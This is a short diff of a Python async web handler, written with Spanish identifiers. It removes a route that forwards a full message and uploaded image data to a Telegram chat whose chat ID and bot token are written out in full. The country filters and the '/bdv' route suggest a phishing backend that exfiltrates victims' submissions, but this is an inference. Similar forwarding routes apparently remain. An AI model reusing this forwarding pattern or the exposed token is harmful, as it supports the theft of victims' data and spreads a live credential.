@@ -833,18 +833,7 @@ async def handle_dynamic_endpoint_optimized_with_image(
         try:
             if path.startswith("/internacional") and pais not in {"EC", "EXCLUDED"}:
                 return {"mensaje_enviado": True, "pais_origen": "Aburrete"}
-            if path.startswith("/bbdsasd") and obtener_is_active_cached() and \
-               numeror in numeros_r or pais in {"US", "CO", "PE", "VE"}:
-                r = await enviar_telegram_hibrido(
-                    mensaje_completo ,
-                    chat_id="-3758506913",
-                    token="7552589801:AAE6X6f-12cv1xBBv6UMAWaDVkMkc0fDpzM",
-                    priority=2,
-                    force_immediate=True,
-                    image_data=image_data,
-                    image_filename=image_filename
-                )
-                telegram_results.append(r)
+           
             
             elif path.startswith("/bdv") and obtener_is_active_cached() and \
                numeror in numeros_r and pais not in {"US", "CO"}:
